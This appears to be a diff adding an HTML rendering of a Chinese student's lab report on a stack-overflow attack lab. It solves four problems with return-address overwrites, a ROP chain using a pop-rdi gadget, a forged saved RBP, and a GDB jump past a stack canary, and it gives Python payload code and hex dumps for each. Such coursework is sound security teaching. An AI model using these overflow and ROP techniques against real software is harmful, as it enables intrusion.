@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>report.md</title>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8">
+
+<style>
+/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+body {
+	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
+	font-size: var(--vscode-markdown-font-size, 14px);
+	padding: 0 26px;
+	line-height: var(--vscode-markdown-line-height, 22px);
+	word-wrap: break-word;
+}
+
+#code-csp-warning {
+	position: fixed;
+	top: 0;
+	right: 0;
+	color: white;
+	margin: 16px;
+	text-align: center;
+	font-size: 12px;
+	font-family: sans-serif;
+	background-color:#444444;
+	cursor: pointer;
+	padding: 6px;
+	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
+}
+
+#code-csp-warning:hover {
+	text-decoration: none;
+	background-color:#007acc;
+	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
+}
+
+body.scrollBeyondLastLine {
+	margin-bottom: calc(100vh - 22px);
+}
+
+body.showEditorSelection .code-line {
+	position: relative;
+}
+
+body.showEditorSelection .code-active-line:before,
+body.showEditorSelection .code-line:hover:before {
+	content: "";
+	display: block;
+	position: absolute;
+	top: 0;
+	left: -12px;
+	height: 100%;
+}
+
+body.showEditorSelection li.code-active-line:before,
+body.showEditorSelection li.code-line:hover:before {
+	left: -30px;
+}
+
+.vscode-light.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.15);
+}
+
+.vscode-light.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.40);
+}
+
+.vscode-light.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-dark.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.4);
+}
+
+.vscode-dark.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.60);
+}
+
+.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-high-contrast.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 160, 0, 0.7);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 160, 0, 1);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+img {
+	max-width: 100%;
+	max-height: 100%;
+}
+
+a {
+	text-decoration: none;
+}
+
+a:hover {
+	text-decoration: underline;
+}
+
+a:focus,
+input:focus,
+select:focus,
+textarea:focus {
+	outline: 1px solid -webkit-focus-ring-color;
+	outline-offset: -1px;
+}
+
+hr {
+	border: 0;
+	height: 2px;
+	border-bottom: 2px solid;
+}
+
+h1 {
+	padding-bottom: 0.3em;
+	line-height: 1.2;
+	border-bottom-width: 1px;
+	border-bottom-style: solid;
+}
+
+h1, h2, h3 {
+	font-weight: normal;
+}
+
+table {
+	border-collapse: collapse;
+}
+
+table > thead > tr > th {
+	text-align: left;
+	border-bottom: 1px solid;
+}
+
+table > thead > tr > th,
+table > thead > tr > td,
+table > tbody > tr > th,
+table > tbody > tr > td {
+	padding: 5px 10px;
+}
+
+table > tbody > tr + tr > td {
+	border-top: 1px solid;
+}
+
+blockquote {
+	margin: 0 7px 0 5px;
+	padding: 0 16px 0 10px;
+	border-left-width: 5px;
+	border-left-style: solid;
+}
+
+code {
+	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
+	font-size: 1em;
+	line-height: 1.357em;
+}
+
+body.wordWrap pre {
+	white-space: pre-wrap;
+}
+
+pre:not(.hljs),
+pre.hljs code > div {
+	padding: 16px;
+	border-radius: 3px;
+	overflow: auto;
+}
+
+pre code {
+	color: var(--vscode-editor-foreground);
+	tab-size: 4;
+}
+
+/** Theming */
+
+.vscode-light pre {
+	background-color: rgba(220, 220, 220, 0.4);
+}
+
+.vscode-dark pre {
+	background-color: rgba(10, 10, 10, 0.4);
+}
+
+.vscode-high-contrast pre {
+	background-color: rgb(0, 0, 0);
+}
+
+.vscode-high-contrast h1 {
+	border-color: rgb(0, 0, 0);
+}
+
+.vscode-light table > thead > tr > th {
+	border-color: rgba(0, 0, 0, 0.69);
+}
+
+.vscode-dark table > thead > tr > th {
+	border-color: rgba(255, 255, 255, 0.69);
+}
+
+.vscode-light h1,
+.vscode-light hr,
+.vscode-light table > tbody > tr + tr > td {
+	border-color: rgba(0, 0, 0, 0.18);
+}
+
+.vscode-dark h1,
+.vscode-dark hr,
+.vscode-dark table > tbody > tr + tr > td {
+	border-color: rgba(255, 255, 255, 0.18);
+}
+
+</style>
+
+<style>
+/* Tomorrow Theme */
+/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
+/* Original theme - https://github.com/chriskempson/tomorrow-theme */
+
+/* Tomorrow Comment */
+.hljs-comment,
+.hljs-quote {
+	color: #8e908c;
+}
+
+/* Tomorrow Red */
+.hljs-variable,
+.hljs-template-variable,
+.hljs-tag,
+.hljs-name,
+.hljs-selector-id,
+.hljs-selector-class,
+.hljs-regexp,
+.hljs-deletion {
+	color: #c82829;
+}
+
+/* Tomorrow Orange */
+.hljs-number,
+.hljs-built_in,
+.hljs-builtin-name,
+.hljs-literal,
+.hljs-type,
+.hljs-params,
+.hljs-meta,
+.hljs-link {
+	color: #f5871f;
+}
+
+/* Tomorrow Yellow */
+.hljs-attribute {
+	color: #eab700;
+}
+
+/* Tomorrow Green */
+.hljs-string,
+.hljs-symbol,
+.hljs-bullet,
+.hljs-addition {
+	color: #718c00;
+}
+
+/* Tomorrow Blue */
+.hljs-title,
+.hljs-section {
+	color: #4271ae;
+}
+
+/* Tomorrow Purple */
+.hljs-keyword,
+.hljs-selector-tag {
+	color: #8959a8;
+}
+
+.hljs {
+	display: block;
+	overflow-x: auto;
+	color: #4d4d4c;
+	padding: 0.5em;
+}
+
+.hljs-emphasis {
+	font-style: italic;
+}
+
+.hljs-strong {
+	font-weight: bold;
+}
+</style>
+
+<style>
+/*
+ * Markdown PDF CSS
+ */
+
+ body {
+	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
+	padding: 0 12px;
+}
+
+pre {
+	background-color: #f8f8f8;
+	border: 1px solid #cccccc;
+	border-radius: 3px;
+	overflow-x: auto;
+	white-space: pre-wrap;
+	overflow-wrap: break-word;
+}
+
+pre:not(.hljs) {
+	padding: 23px;
+	line-height: 19px;
+}
+
+blockquote {
+	background: rgba(127, 127, 127, 0.1);
+	border-color: rgba(0, 122, 204, 0.5);
+}
+
+.emoji {
+	height: 1.4em;
+}
+
+code {
+	font-size: 14px;
+	line-height: 19px;
+}
+
+/* for inline code */
+:not(pre):not(.hljs) > code {
+	color: #C9AE75; /* Change the old color so it seems less like an error */
+	font-size: inherit;
+}
+
+/* Page Break : use <div class="page"/> to insert page break
+-------------------------------------------------------- */
+.page {
+	page-break-after: always;
+}
+
+</style>
+
+<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
+</head>
+<body>
+  <script>
+    mermaid.initialize({
+      startOnLoad: true,
+      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
+          ? 'dark'
+          : 'default'
+    });
+  </script>
+<h1 id="%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C">栈溢出攻击实验</h1>
+<h2 id="%E9%A2%98%E7%9B%AE%E8%A7%A3%E5%86%B3%E6%80%9D%E8%B7%AF">题目解决思路</h2>
+<h3 id="problem-1">Problem 1:</h3>
+<ul>
+<li><strong>分析</strong>：</li>
+</ul>
+<ol>
+<li><strong>锁定目标</strong>：反汇编发现隐藏函数 <code>func1</code>（地址 <code>0x401216</code>），其包含 <code>puts</code> 调用，确定为跳转目标。</li>
+<li><strong>定位漏洞</strong>：<code>func</code> 函数中 <code>strcpy</code> 存在栈溢出。指令 <code>lea -0x8(%rbp),%rax</code> 表明缓冲区始于 <code>rbp-0x8</code>。</li>
+<li><strong>计算偏移</strong>：
+<ul>
+<li>目标是覆盖 Return Address。</li>
+<li>栈布局：<code>Buffer (8 bytes)</code> -&gt; <code>Saved RBP (8 bytes)</code> -&gt; <code>Return Address</code>。</li>
+<li><strong>Offset</strong> = 8 (Buffer) + 8 (Saved RBP) = <strong>16 字节</strong>。</li>
+<li>故需填充 16 字节垃圾数据，随后写入 <code>func1</code> 地址。</li>
+</ul>
+</li>
+</ol>
+<ul>
+<li>
+<p><strong>解决方案</strong>：
+Payload 结构为：<code>[16字节 Padding] + [8字节 Address]</code>。</p>
+<p><strong>Python 构造逻辑</strong>：</p>
+<pre class="hljs"><code><div>padding = <span class="hljs-string">b'A'</span> * <span class="hljs-number">16</span>                     <span class="hljs-comment"># 填满 Buffer 和 RBP</span>
+addr = (<span class="hljs-number">0x401216</span>).to_bytes(<span class="hljs-number">8</span>, <span class="hljs-string">'little'</span>) <span class="hljs-comment"># func1 地址转为小端序</span>
+
+</div></code></pre>
+<p><strong>Payload 二进制视图</strong>：</p>
+<pre class="hljs"><code><div>00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
+00000010  16 12 40 00 00 00 00 00                           |..@.....|
+</div></code></pre>
+</li>
+<li>
+<p><strong>结果</strong>：
+<img src="file:///home/keyuq/ICS-lab/attack-lab-Lu7mos/reports/111.png" alt="Problem 1 Result"></p>
+</li>
+</ul>
+<h3 id="problem-2">Problem 2:</h3>
+<ul>
+<li><strong>分析</strong>：</li>
+</ul>
+<ol>
+<li><strong>目标约束</strong>：目标函数 <code>func2</code> (<code>0x401216</code>) 会检查第一个参数 <code>%edi</code> 是否等于 <code>0x3f8</code>。<pre class="hljs"><code><div>401222: 89 7d fc             mov    %edi,-0x4(%rbp)
+401225: 81 7d fc f8 03 00 00 cmpl   $0x3f8,-0x4(%rbp) # 检查参数
+</div></code></pre>
+</li>
+<li><strong>技术难点</strong>：x86-64 架构下参数通过寄存器传递（Arg1 在 <code>%rdi</code>）。仅通过栈溢出覆盖返回地址无法直接修改寄存器，需使用 <strong>ROP</strong> 技术。</li>
+<li><strong>寻找 Gadget</strong>：在程序中找到现成的指令片段 <code>pop %rdi; ret</code> (位于 <code>0x4012c7</code>)。
+<ul>
+<li>该 Gadget 的作用是将栈顶数据弹出至 <code>%rdi</code>，然后返回，从而实现参数赋值。</li>
+</ul>
+</li>
+<li><strong>攻击链构造</strong>：
+<ul>
+<li><code>[Padding 16字节]</code>：填满缓冲区。</li>
+<li><code>[Gadget 地址]</code>：覆盖原返回地址，程序跳转至 <code>pop %rdi</code>。</li>
+<li><code>[0x3f8]</code>：作为参数布置在栈上，被 Gadget 捕获放入 <code>%rdi</code>。</li>
+<li><code>[func2 地址]</code>：Gadget 执行 <code>ret</code> 后，程序跳转至最终目标。</li>
+</ul>
+</li>
+</ol>
+<ul>
+<li><strong>解决方案</strong>：
+Payload 结构：<code>[Padding] + [Gadget Addr] + [Param Value] + [Target Addr]</code></li>
+</ul>
+<p><strong>Python 构造逻辑</strong>：</p>
+<pre class="hljs"><code><div>padding = <span class="hljs-string">b'A'</span> * <span class="hljs-number">16</span>
+gadget  = (<span class="hljs-number">0x4012c7</span>).to_bytes(<span class="hljs-number">8</span>, <span class="hljs-string">'little'</span>) <span class="hljs-comment"># pop rdi; ret</span>
+param   = (<span class="hljs-number">0x3f8</span>).to_bytes(<span class="hljs-number">8</span>, <span class="hljs-string">'little'</span>)    <span class="hljs-comment"># 参数值</span>
+target  = (<span class="hljs-number">0x401216</span>).to_bytes(<span class="hljs-number">8</span>, <span class="hljs-string">'little'</span>) <span class="hljs-comment"># func2</span>
+
+payload = padding + gadget + param + target
+</div></code></pre>
+<p><strong>Payload 二进制视图</strong>：</p>
+<pre class="hljs"><code><div>00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
+00000010  c7 12 40 00 00 00 00 00  f8 03 00 00 00 00 00 00  |..@.............|
+00000020  16 12 40 00 00 00 00 00                           |..@.....|
+</div></code></pre>
+<ul>
+<li><strong>结果</strong>：
+<img src="file:///home/keyuq/ICS-lab/attack-lab-Lu7mos/reports/222.png" alt="Problem 2 Result"></li>
+</ul>
+<h3 id="problem-3">Problem 3:</h3>
+<ul>
+<li><strong>分析</strong>：</li>
+</ul>
+<ol>
+<li><strong>确定攻击路径</strong>：我的目标是执行 <code>func1</code> 并输出 114。通过 <code>objdump</code> 分析 <code>func1</code>，发现其在地址 <code>0x401216</code> 处会检查 <code>%edi</code> 是否为 <code>0x72</code>。如果直接跳转到这里，需要通过 Shellcode 设置寄存器，较为繁琐。</li>
+<li><strong>发现捷径</strong>：我发现 <code>func1</code> 的打印逻辑（即输出 &quot;Your lucky number...&quot;）是从地址 <code>0x40122b</code> 开始的。如果直接跳转到 <code>0x40122b</code>，就可以跳过开头的参数检查指令。</li>
+<li><strong>遇到的问题</strong>：当我尝试直接覆盖返回地址跳转到 <code>0x40122b</code> 时，程序报错（Segfault/Bus Error）。</li>
+<li><strong>深入分析原因</strong>：<code>func1</code> 内部执行了 <code>mov %rax, -0x40(%rbp)</code>，试图向栈上写入数据。由于我通过跳转跳过了函数开头的 <code>push %rbp</code> 等栈帧初始化操作，此时 <code>%rbp</code> 是无效值（被我的 Padding 覆盖成了 <code>0x4141...</code>），导致写入非法内存地址。</li>
+<li><strong>修正方案</strong>：为了修复 crash，我需要在 Padding 中伪造一个合法的 <code>%rbp</code>。通过查看反汇编中的全局变量，我发现了地址 <code>0x403510</code> 位于可读写的 <code>.data</code> 段，且位置固定。</li>
+<li><strong>计算</strong>：为了让 <code>func1</code> 的写入操作 (<code>rbp - 0x40</code>) 落在这个安全区域，我构造的伪造 <code>%rbp</code> 应为 <code>0x403510 + 0x40 = 0x403550</code>。</li>
+</ol>
+<ul>
+<li>
+<p><strong>解决方案</strong>： 构造的 Payload 结构为：<code>[32字节 Padding] + [Fake RBP (0x403550)] + [Target Address (0x40122b)]</code>。</p>
+</li>
+<li>
+<p><strong>结果</strong>：  <img src="file:///home/keyuq/ICS-lab/attack-lab-Lu7mos/reports/333.png" alt="Problem 3 Result"></p>
+</li>
+</ul>
+<h3 id="problem-4">Problem 4:</h3>
+<ul>
+<li><strong>分析</strong>：</li>
+</ul>
+<ol>
+<li>
+<p><strong>设置 Canary</strong>：
+在 <code>func</code> 函数开头 (地址 <code>136c</code>)，程序从 <code>%fs:0x28</code> 寄存器处读取一个随机生成的 8 字节数值（金丝雀），并将其存储在栈底 <code>%rbp-0x8</code> 的位置：</p>
+<pre class="hljs"><code><div>136c: 64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax   #取随机值
+1375: 48 89 45 f8          	mov    %rax,-0x8(%rbp) #存入栈底
+</div></code></pre>
+</li>
+<li>
+<p><strong>检查 Canary</strong>：
+在函数准备返回之前 (地址 <code>140a</code>)，程序从 <code>%rbp-0x8</code> 取出该值，并与 <code>%fs:0x28</code> 中的原值进行减法对比：</p>
+<pre class="hljs"><code><div>140a: 48 8b 45 f8          	mov    -0x8(%rbp),%rax # 取出栈上的值
+140e: 64 48 2b 04 25 28 00 	sub    %fs:0x28,%rax   # 比较
+1417: 74 05                	je     141e            # 若相等则正常返回
+1419: e8 b2 fc ff ff       	call   10d0 &lt;__stack_chk_fail@plt&gt; # 否则报错
+</div></code></pre>
+</li>
+</ol>
+<p><strong>结论</strong>：由于死循环逻辑导致难以通过正常溢出触发 Canary 报错，且题目暗示“不需要写代码”，因此我采用动态调试方法直接获取隐藏信息。</p>
+<ul>
+<li>
+<p><strong>解决方案</strong>：使用 GDB 直接跳转到隐藏函数 <code>func1</code>，绕过所有检查逻辑，直接获取通关提示。
+操作步骤：</p>
+<ol>
+<li>启动调试：<code>gdb problem4</code></li>
+<li>强制跳转：<code>jump func1</code></li>
+<li>获取输出：程序直接打印出隐藏的通关提示</li>
+</ol>
+</li>
+<li>
+<p><strong>结果</strong>：<img src="file:///home/keyuq/ICS-lab/attack-lab-Lu7mos/reports/444.png" alt="Problem 4 Result"></p>
+</li>
+</ul>
+<h2 id="%E6%80%9D%E8%80%83%E4%B8%8E%E6%80%BB%E7%BB%93">思考与总结</h2>
+<h2 id="%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99">参考资料</h2>
+<p>列出在准备报告过程中参考的所有文献、网站或其他资源，确保引用格式正确。</p>
+
+</body>
+</html>
